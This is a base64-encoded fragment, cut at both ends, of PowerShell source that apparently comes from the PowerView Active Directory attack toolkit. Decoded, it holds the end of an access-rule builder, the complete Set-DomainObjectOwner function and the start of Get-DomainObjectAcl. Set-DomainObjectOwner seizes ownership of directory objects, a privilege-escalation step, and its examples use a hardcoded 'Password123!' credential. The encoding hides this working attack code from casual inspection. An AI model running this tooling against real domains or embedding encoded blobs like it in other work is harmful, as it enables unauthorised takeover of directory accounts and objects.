0b3J5UmlnaHRzXSRBRFJpZ2h0CgogICAgICAgICRJZGVudGl0eSA9IFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLklkZW50aXR5UmVmZXJlbmNlXSAoW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyXSRPYmplY3RTaWQpCiAgICB9CgogICAgUHJvY2VzcyB7CiAgICAgICAgaWYoJFBTQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLWVxICdBdWRpdFJ1bGVUeXBlJykgewoKICAgICAgICAgICAgaWYoJE9iamVjdFR5cGUgLWVxICRudWxsIC1hbmQgJEluaGVyaXRhbmNlVHlwZSAtZXEgW1N0cmluZ106OkVtcHR5IC1hbmQgJEluaGVyaXRlZE9iamVjdFR5cGUgLWVxICRudWxsKSB7CiAgICAgICAgICAgICAgICBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlBdWRpdFJ1bGUgLUFyZ3VtZW50TGlzdCAkSWRlbnRpdHksICRBRFJpZ2h0LCAkQXVkaXRGbGFnCiAgICAgICAgICAgIH0gZWxzZWlmKCRPYmplY3RUeXBlIC1lcSAkbnVsbCAtYW5kICRJbmhlcml0YW5jZVR5cGUgLW5lIFtTdHJpbmddOjpFbXB0eSAtYW5kICRJbmhlcml0ZWRPYmplY3RUeXBlIC1lcSAkbnVsbCkgewogICAgICAgICAgICAgICAgTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5QXVkaXRSdWxlIC1Bcmd1bWVudExpc3QgJElkZW50aXR5LCAkQURSaWdodCwgJEF1ZGl0RmxhZywgKFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5U2VjdXJpdHlJbmhlcml0YW5jZV0kSW5oZXJpdGFuY2VUeXBlKQogICAgICAgICAgICB9IGVsc2VpZigkT2JqZWN0VHlwZSAtZXEgJG51bGwgLWFuZCAkSW5oZXJpdGFuY2VUeXBlIC1uZSBbU3RyaW5nXTo6RW1wdHkgLWFuZCAkSW5oZXJpdGVkT2JqZWN0VHlwZSAtbmUgJG51bGwpIHsKICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeUF1ZGl0UnVsZSAtQXJndW1lbnRMaXN0ICRJZGVudGl0eSwgJEFEUmlnaHQsICRBdWRpdEZsYWcsIChbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeVNlY3VyaXR5SW5oZXJpdGFuY2VdJEluaGVyaXRhbmNlVHlwZSksICRJbmhlcml0ZWRPYmplY3RUeXBlCiAgICAgICAgICAgIH0gZWxzZWlmKCRPYmplY3RUeXBlIC1uZSAkbnVsbCAtYW5kICRJbmhlcml0YW5jZVR5cGUgLWVxIFtTdHJpbmddOjpFbXB0eSAtYW5kICRJbmhlcml0ZWRPYmplY3RUeXBlIC1lcSAkbnVsbCkgewogICAgICAgICAgICAgICAgTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5QXVkaXRSdWxlIC1Bcmd1bWVudExpc3QgJElkZW50aXR5LCAkQURSaWdodCwgJEF1ZGl0RmxhZywgJE9iamVjdFR5cGUKICAgICAgICAgICAgfSBlbHNlaWYoJE9iamVjdFR5cGUgLW5lICRudWxsIC1hbmQgJEluaGVyaXRhbmNlVHlwZSAtbmUgW1N0cmluZ106OkVtcHR5IC1hbmQgJEluaGVyaXRlZE9iamVjdFR5cGUgLWVxICRudWxsKSB7CiAgICAgICAgICAgICAgICBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlBdWRpdFJ1bGUgLUFyZ3VtZW50TGlzdCAkSWRlbnRpdHksICRBRFJpZ2h0LCAkQXVkaXRGbGFnLCAkT2JqZWN0VHlwZSwgJEluaGVyaXRhbmNlVHlwZQogICAgICAgICAgICB9IGVsc2VpZigkT2JqZWN0VHlwZSAtbmUgJG51bGwgLWFuZCAkSW5oZXJpdGFuY2VUeXBlIC1uZSBbU3RyaW5nXTo6RW1wdHkgLWFuZCAkSW5oZXJpdGVkT2JqZWN0VHlwZSAtbmUgJG51bGwpIHsKICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeUF1ZGl0UnVsZSAtQXJndW1lbnRMaXN0ICRJZGVudGl0eSwgJEFEUmlnaHQsICRBdWRpdEZsYWcsICRPYmplY3RUeXBlLCAkSW5oZXJpdGFuY2VUeXBlLCAkSW5oZXJpdGVkT2JqZWN0VHlwZQogICAgICAgICAgICB9CgogICAgICAgIH0KICAgICAgICBlbHNlIHsKCiAgICAgICAgICAgIGlmKCRPYmplY3RUeXBlIC1lcSAkbnVsbCAtYW5kICRJbmhlcml0YW5jZVR5cGUgLWVxIFtTdHJpbmddOjpFbXB0eSAtYW5kICRJbmhlcml0ZWRPYmplY3RUeXBlIC1lcSAkbnVsbCkgewogICAgICAgICAgICAgICAgTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5QWNjZXNzUnVsZSAtQXJndW1lbnRMaXN0ICRJZGVudGl0eSwgJEFEUmlnaHQsICRBY2Nlc3NDb250cm9sVHlwZQogICAgICAgICAgICB9IGVsc2VpZigkT2JqZWN0VHlwZSAtZXEgJG51bGwgLWFuZCAkSW5oZXJpdGFuY2VUeXBlIC1uZSBbU3RyaW5nXTo6RW1wdHkgLWFuZCAkSW5oZXJpdGVkT2JqZWN0VHlwZSAtZXEgJG51bGwpIHsKICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeUFjY2Vzc1J1bGUgLUFyZ3VtZW50TGlzdCAkSWRlbnRpdHksICRBRFJpZ2h0LCAkQWNjZXNzQ29udHJvbFR5cGUsIChbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeVNlY3VyaXR5SW5oZXJpdGFuY2VdJEluaGVyaXRhbmNlVHlwZSkKICAgICAgICAgICAgfSBlbHNlaWYoJE9iamVjdFR5cGUgLWVxICRudWxsIC1hbmQgJEluaGVyaXRhbmNlVHlwZSAtbmUgW1N0cmluZ106OkVtcHR5IC1hbmQgJEluaGVyaXRlZE9iamVjdFR5cGUgLW5lICRudWxsKSB7CiAgICAgICAgICAgICAgICBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlBY2Nlc3NSdWxlIC1Bcmd1bWVudExpc3QgJElkZW50aXR5LCAkQURSaWdodCwgJEFjY2Vzc0NvbnRyb2xUeXBlLCAoW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlTZWN1cml0eUluaGVyaXRhbmNlXSRJbmhlcml0YW5jZVR5cGUpLCAkSW5oZXJpdGVkT2JqZWN0VHlwZQogICAgICAgICAgICB9IGVsc2VpZigkT2JqZWN0VHlwZSAtbmUgJG51bGwgLWFuZCAkSW5oZXJpdGFuY2VUeXBlIC1lcSBbU3RyaW5nXTo6RW1wdHkgLWFuZCAkSW5oZXJpdGVkT2JqZWN0VHlwZSAtZXEgJG51bGwpIHsKICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeUFjY2Vzc1J1bGUgLUFyZ3VtZW50TGlzdCAkSWRlbnRpdHksICRBRFJpZ2h0LCAkQWNjZXNzQ29udHJvbFR5cGUsICRPYmplY3RUeXBlCiAgICAgICAgICAgIH0gZWxzZWlmKCRPYmplY3RUeXBlIC1uZSAkbnVsbCAtYW5kICRJbmhlcml0YW5jZVR5cGUgLW5lIFtTdHJpbmddOjpFbXB0eSAtYW5kICRJbmhlcml0ZWRPYmplY3RUeXBlIC1lcSAkbnVsbCkgewogICAgICAgICAgICAgICAgTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5QWNjZXNzUnVsZSAtQXJndW1lbnRMaXN0ICRJZGVudGl0eSwgJEFEUmlnaHQsICRBY2Nlc3NDb250cm9sVHlwZSwgJE9iamVjdFR5cGUsICRJbmhlcml0YW5jZVR5cGUKICAgICAgICAgICAgfSBlbHNlaWYoJE9iamVjdFR5cGUgLW5lICRudWxsIC1hbmQgJEluaGVyaXRhbmNlVHlwZSAtbmUgW1N0cmluZ106OkVtcHR5IC1hbmQgJEluaGVyaXRlZE9iamVjdFR5cGUgLW5lICRudWxsKSB7CiAgICAgICAgICAgICAgICBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlBY2Nlc3NSdWxlIC1Bcmd1bWVudExpc3QgJElkZW50aXR5LCAkQURSaWdodCwgJEFjY2Vzc0NvbnRyb2xUeXBlLCAkT2JqZWN0VHlwZSwgJEluaGVyaXRhbmNlVHlwZSwgJEluaGVyaXRlZE9iamVjdFR5cGUKICAgICAgICAgICAgfQoKICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBTZXQtRG9tYWluT2JqZWN0T3duZXIgewo8IwouU1lOT1BTSVMKCk1vZGlmaWVzIHRoZSBvd25lciBmb3IgYSBzcGVjaWZpZWQgYWN0aXZlIGRpcmVjdG9yeSBvYmplY3QuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW5PYmplY3QgIAoKLkRFU0NSSVBUSU9OCgpSZXRyaWV2ZXMgdGhlIEFjdGl2ZSBEaXJlY3Rvcnkgb2JqZWN0IHNwZWNpZmllZCBieSAtSWRlbnRpdHkgYnkgc3BsYXR0aW5nIHRvCkdldC1Eb21haW5PYmplY3QsIHJldHVybmluZyB0aGUgcmF3IHNlYXJjaHJlc3VsdCBvYmplY3QuIFJldHJpZXZlcyB0aGUgcmF3CmRpcmVjdG9yeWVudHJ5IGZvciB0aGUgb2JqZWN0LCBhbmQgc2V0cyB0aGUgb2JqZWN0IG93bmVyIHRvIC1Pd25lcklkZW50aXR5LgoKLlBBUkFNRVRFUiBJZGVudGl0eQoKQSBTYW1BY2NvdW50TmFtZSAoZS5nLiBoYXJtajB5KSwgRGlzdGluZ3Vpc2hlZE5hbWUgKGUuZy4gQ049aGFybWoweSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsKSwKU0lEIChlLmcuIFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTEwOCksIG9yIEdVSUQgKGUuZy4gNGM0MzVkZDctZGM1OC00YjE0LTlhNWUtMWZkYjBlODBkMjAxKQpvZiB0aGUgQUQgb2JqZWN0IHRvIHNldCB0aGUgb3duZXIgZm9yLgoKLlBBUkFNRVRFUiBPd25lcklkZW50aXR5CgpBIFNhbUFjY291bnROYW1lIChlLmcuIGhhcm1qMHkpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiBDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwpLApTSUQgKGUuZy4gUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4KSwgb3IgR1VJRCAoZS5nLiA0YzQzNWRkNy1kYzU4LTRiMTQtOWE1ZS0xZmRiMGU4MGQyMDEpCm9mIHRoZSBvd25lciB0byBzZXQgZm9yIC1JZGVudGl0eS4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKClNldC1Eb21haW5PYmplY3RPd25lciAtSWRlbnRpdHkgZGZtIC1Pd25lcklkZW50aXR5IGhhcm1qMHkKClNldCB0aGUgb3duZXIgb2YgJ2RmbScgaW4gdGhlIGN1cnJlbnQgZG9tYWluIHRvICdoYXJtajB5Jy4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpTZXQtRG9tYWluT2JqZWN0T3duZXIgLUlkZW50aXR5IGRmbSAtT3duZXJJZGVudGl0eSBoYXJtajB5IC1DcmVkZW50aWFsICRDcmVkCgpTZXQgdGhlIG93bmVyIG9mICdkZm0nIGluIHRoZSBjdXJyZW50IGRvbWFpbiB0byAnaGFybWoweScgdXNpbmcgdGhlIGFsdGVybmF0ZSBjcmVkZW50aWFscy4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VTaG91bGRQcm9jZXNzRm9yU3RhdGVDaGFuZ2luZ0Z1bmN0aW9ucycsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnRGlzdGluZ3Vpc2hlZE5hbWUnLCAnU2FtQWNjb3VudE5hbWUnLCAnTmFtZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJElkZW50aXR5LAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnT3duZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRPd25lcklkZW50aXR5LAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgICRPd25lclNpZCA9IEdldC1Eb21haW5PYmplY3QgQFNlYXJjaGVyQXJndW1lbnRzIC1JZGVudGl0eSAkT3duZXJJZGVudGl0eSAtUHJvcGVydGllcyBvYmplY3RzaWQgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBvYmplY3RzaWQKICAgICAgICBpZiAoJE93bmVyU2lkKSB7CiAgICAgICAgICAgICRPd25lcklkZW50aXR5UmVmZXJlbmNlID0gW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyXSRPd25lclNpZAogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW1NldC1Eb21haW5PYmplY3RPd25lcl0gRXJyb3IgcGFyc2luZyBvd25lciBpZGVudGl0eSAnJE93bmVySWRlbnRpdHknIgogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJE93bmVySWRlbnRpdHlSZWZlcmVuY2UpIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydSYXcnXSA9ICRUcnVlCiAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRJZGVudGl0eQoKICAgICAgICAgICAgIyBzcGxhdCB0aGUgYXBwcm9wcmlhdGUgYXJndW1lbnRzIHRvIEdldC1Eb21haW5PYmplY3QKICAgICAgICAgICAgJFJhd09iamVjdCA9IEdldC1Eb21haW5PYmplY3QgQFNlYXJjaGVyQXJndW1lbnRzCgogICAgICAgICAgICBGb3JFYWNoICgkT2JqZWN0IGluICRSYXdPYmplY3QpIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1NldC1Eb21haW5PYmplY3RPd25lcl0gQXR0ZW1wdGluZyB0byBzZXQgdGhlIG93bmVyIGZvciAnJElkZW50aXR5JyB0byAnJE93bmVySWRlbnRpdHknIgogICAgICAgICAgICAgICAgICAgICRFbnRyeSA9ICRSYXdPYmplY3QuR2V0RGlyZWN0b3J5RW50cnkoKQogICAgICAgICAgICAgICAgICAgICRFbnRyeS5Qc0Jhc2UuT3B0aW9ucy5TZWN1cml0eU1hc2tzID0gJ093bmVyJwogICAgICAgICAgICAgICAgICAgICRFbnRyeS5Qc0Jhc2UuT2JqZWN0U2VjdXJpdHkuU2V0T3duZXIoJE93bmVySWRlbnRpdHlSZWZlcmVuY2UpCiAgICAgICAgICAgICAgICAgICAgJEVudHJ5LlBzQmFzZS5Db21taXRDaGFuZ2VzKCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbU2V0LURvbWFpbk9iamVjdE93bmVyXSBFcnJvciBzZXR0aW5nIG93bmVyOiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5PYmplY3RBY2wgewo8IwouU1lOT1BTSVMKClJldHVybnMgdGhlIEFDTHMgYXNzb2NpYXRlZCB3aXRoIGEgc3BlY2lmaWMgYWN0aXZlIGRpcmVjdG9yeSBvYmplY3QuIEJ5IGRlZmF1bHQKdGhlIERBQ0wgZm9yIHRoZSBvYmplY3QocykgaXMgcmV0dXJuZWQsIGJ1dCB0aGUgU0FDTCBjYW4gYmUgcmV0dXJuZWQgd2l0aCAtU2FjbC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpblNlYXJjaGVyLCBHZXQtRG9tYWluR1VJRE1hcCAgCgouUEFSQU1FVEVSIElkZW50aXR5CgpBIFNhbUFjY291bnROYW1lIChlLmcuIGhhcm1qMHkpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiBDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwpLApTSUQgKGUuZy4gUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4KSwgb3IgR1VJRCAoZS5nLiA0YzQzNWRkNy1kYzU4LTRiMTQtOWE1ZS0xZmRiMGU4MGQyMDEpLgpXaWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIFNhY2wKClN3aXRjaC4gUmV0dXJuIHRoZSBTQUNMIGluc3RlYWQgb2YgdGhlIERBQ0wgZm9yIHRoZSBvYmplY3QgKGRlZmF1bHQgYmVoYXZpb3IpLgoKLlBBUkFNRVRFUiBSZXNvbHZlR1VJRHMKClN3aXRjaC4gUmVzb2x2ZSBHVUlEcyB0byB0aGVpciBkaXNwbGF5IG5hbWVzLgoKLlBBUkFNRVRFUiBSaWdodHNGaWx0ZXIKCkEgc3BlY2lmaWMgc2V0IG9mIHJpZ2h0cyB0byByZXR1cm4gKCdBbGwnLCAnUmVzZXRQYXNzd29yZCcsICdXcml0ZU1lbWJlcnMnKS4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5PYmplY3RBY2wgLUlkZW50aXR5IG1hdHQuYWRtaW4gLWRvbWFpbiB0ZXN0bGFiLmxvY2FsIC1SZXNvbHZlR1VJRHMKCkdldCB0aGUgQUNMcyBmb3IgdGhlIG1hdHQuYWRtaW4gdXNlciBpbiB0aGUgdGVzdGxhYi5sb2NhbCBkb21haW4gYW5kCnJlc29sdmUgcmVs